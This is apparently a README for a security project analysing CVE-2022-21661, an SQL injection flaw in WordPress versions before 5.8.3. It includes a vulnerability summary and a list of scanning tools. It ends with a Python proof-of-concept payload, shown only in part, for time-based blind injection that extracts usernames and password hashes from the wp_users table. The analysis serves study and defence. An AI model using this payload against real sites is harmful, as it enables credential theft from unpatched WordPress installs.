# WordPress Security: CVE-2022-21661 Vulnerability Analysis

![WordPress Logo](https://upload.wikimedia.org/wikipedia/commons/9/98/WordPress_blue_logo.svg)

This project is a security-focused analysis of **CVE-2022-21661**, a critical SQL injection vulnerability in WordPress Core (versions < 5.8.3). The study includes in-depth technical dissection, static and dynamic vulnerability assessments, and a proof-of-concept exploit to demonstrate the impact.

---


- Understand typical security challenges in open-source platforms like WordPress.
- Analyze CVE-2022-21661: its origin, attack vector, and exploitation potential.
- Emphasize the importance of secure coding, vulnerability patching, and responsible disclosure.

---

Technical Summary

- Vulnerability:** SQL Injection via `WP_Query` due to improper input validation in `clean_query()`
- Affected Versions:** WordPress < 5.8.3
- CVSS Score:** 7.5 (High)
- Exploitation Vector:** Remote attackers can inject SQL through third-party plugins using the WP_Query interface.
- Impact: Unauthorized data access, potential data corruption, and full system compromise.

---

Tools & Techniques

 Analysis Methods
- Static Analysis:** SonarQube, PHP_CodeSniffer
- Dynamic Analysis:** OWASP ZAP, Wapiti
- Software Composition Analysis:** WPScan, Wordfence, OWASP Dependency-Check

Tools Used
| Tool | Purpose |
|------|---------|
| WPScan | Identify core/plugin vulnerabilities |
| Wordfence | Detect real-time threats |
| Dependency-Check | Analyze plugin dependencies |
| SonarQube | Static code security review |
| PHP_CodeSniffer | Enforce WP coding standards |
| OWASP ZAP | Runtime vulnerability detection |
| Wapiti | Identify header/config issues |

---

Exploit Proof-of-Concept

A time-based blind SQL injection attack was demonstrated using a crafted payload via AJAX endpoint. The script uses latency to infer character-by-character data extraction from the WordPress `wp_users` table.

```python
payload = {
    "tax_query": {
        "0": {
            "field": "term_taxonomy_id",
            "terms": [
                "(CASE WHEN (SELECT SUBSTRING((SELECT GROUP_CONCAT(id, ':', user_login, ':', user_pass, ',') FROM wp_users), %d, 1) = '%s') THEN SLEEP(5) ELSE 2070 END)"
            ]
        }
    }
}
